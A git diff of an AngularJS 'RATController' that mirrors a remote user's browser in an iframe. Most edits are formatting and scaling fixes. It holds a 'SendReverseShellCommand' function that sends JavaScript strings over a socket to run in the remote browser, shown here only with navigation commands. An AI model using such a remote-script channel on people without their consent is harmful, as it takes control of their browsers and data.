@@ -98,7 +98,7 @@ Flinger.filter('devicebrowser', function () {
 
 Flinger.filter('splitid', function () {
     return function (input) {
-        return input.slice(0, input.length/2);
+        return input.slice(0, input.length / 2);
     }
 })
 
@@ -376,29 +376,29 @@ Flinger.controller("RATController", function ($scope, RATService, $rootScope) {
         });
     }
 
-    $scope.SendReverseShellCommand = function(rsc){
+    $scope.SendReverseShellCommand = function (rsc) {
         const reverseShellCommand = `${rsc}`;
 
         $scope._ratSocket.emit('Coplest.Flinger.RAT', { Command: 'SendReverseShellCommand#Request', Values: { RoomId: $scope.RoomId, RSC: reverseShellCommand } });
     }
 
-    $scope.ReloadVisor = function(){
+    $scope.ReloadVisor = function () {
         $scope.SendReverseShellCommand("location.reload()");
     }
 
-    $scope.HomeVisor = function(){
+    $scope.HomeVisor = function () {
         $scope.SendReverseShellCommand("location.assign('/')");
     }
 
-    $scope.BackVisor = function(){
+    $scope.BackVisor = function () {
         $scope.SendReverseShellCommand("history.back()");
     }
 
-    $scope.ForwardVisor = function(){
+    $scope.ForwardVisor = function () {
         $scope.SendReverseShellCommand("history.forward()");
     }
 
-    $scope.NavigateVisor = function(){
+    $scope.NavigateVisor = function () {
         $('.tools-bar>input').blur();
         $scope.SendReverseShellCommand(`location.assign('${$scope.CurrentUserPath}')`);
     }
@@ -420,7 +420,7 @@ Flinger.controller("RATController", function ($scope, RATService, $rootScope) {
 
         var currentFrameIdx = 0;
         var framesContainer = document.querySelector('#frame-container');
-        var eventHandler = document.querySelector('.event-handler');debugger;
+        var eventHandler = document.querySelector('.event-handler');
         var blob = new Blob([data.Values.Screenshot], { type: 'text/html' });
 
         var iframeVisorWidthBorder = browserSize.width - 20;
@@ -430,7 +430,8 @@ Flinger.controller("RATController", function ($scope, RATService, $rootScope) {
         var widthAverage = iframeVisorWidthBorder / originalWidthSize;
         var heightAverage = iframeVisorHeightBorder / originalHeightSize;
 
-        var iframeScale = Math.min(1, Math.min(widthAverage, heightAverage)); console.log(iframeScale);
+        //var iframeScale = widthAverage > heightAverage ? Math.min(1, widthAverage) : Math.min(1, heightAverage);
+        var iframeScale = Math.min(1, widthAverage);
         var iframeScaleCSS = "scale(" + iframeScale + "," + iframeScale + ")";
         var iframeWidthRate = data.Values.UserBrowserScreen.width * iframeScale;
         var iframeHeightRate = data.Values.UserBrowserScreen.height * iframeScale;
@@ -459,8 +460,8 @@ Flinger.controller("RATController", function ($scope, RATService, $rootScope) {
         /// Setting Frames Container
         framesContainer.style.marginTop = iframeMarginTop + "px";
         framesContainer.style.marginLeft = iframeMarginLeft + "px";
-        framesContainer.style.width = Math.round(iframeWidthRate) + "px";
-        framesContainer.style.height = Math.round(iframeHeightRate) + "px";
+        /* framesContainer.style.width = Math.round(iframeWidthRate) + "px";
+        framesContainer.style.height = Math.round(iframeHeightRate) + "px"; */
 
         /// Setting Event Handler
         eventHandler.style.marginTop = "75px";
@@ -489,8 +490,36 @@ Flinger.controller("RATController", function ($scope, RATService, $rootScope) {
                 frame.hidden = false;
 
                 currentFrameIdx++;
+
+                var iframeVisorWidthBorder = framesContainer.clientWidth - 20;
+
+                var widthAverage = iframeVisorWidthBorder / originalWidthSize;
+                var heightAverage = iframeVisorHeightBorder / originalHeightSize;
+
+                var iframeScale = Math.min(1, widthAverage);
+                var iframeScaleCSS = "scale(" + iframeScale + "," + iframeScale + ")";
+                var iframeWidthRate = data.Values.UserBrowserScreen.width * iframeScale;
+                var iframeHeightRate = data.Values.UserBrowserScreen.height * iframeScale;
+
+                framesContainer.style.width = Math.round(iframeWidthRate) + "px";
+                framesContainer.style.height = Math.round(iframeHeightRate) + "px";
+
+                /// Setting Scale
+                $scope._iframe.style.webkitTransform = iframeScaleCSS;
+                $scope._iframe.style.transform = iframeScaleCSS;
+                $scope._iframe.style.OTransform = iframeScaleCSS;
+                $scope._iframe.style.MozTransform = iframeScaleCSS;
+                $scope._iframe.style.msTransform = iframeScaleCSS;
+                $scope._iframe.style.transformOrigin = "0 0";
+                $scope._iframe.style.display = "block";
+
+                /// Setting Dimensions
+                $scope._iframe.setAttribute("width", Math.round(iframeWidthRate) + "px");
+                $scope._iframe.setAttribute("height", Math.round(iframeHeightRate) + "px");
+                $scope._iframe.style.width = Math.round(data.Values.UserBrowserScreen.width) + "px";
+                $scope._iframe.style.height = Math.round(data.Values.UserBrowserScreen.height) + "px";
             }
-            
+
         };
 
         // Force the iframe content to load by appending to the DOM.
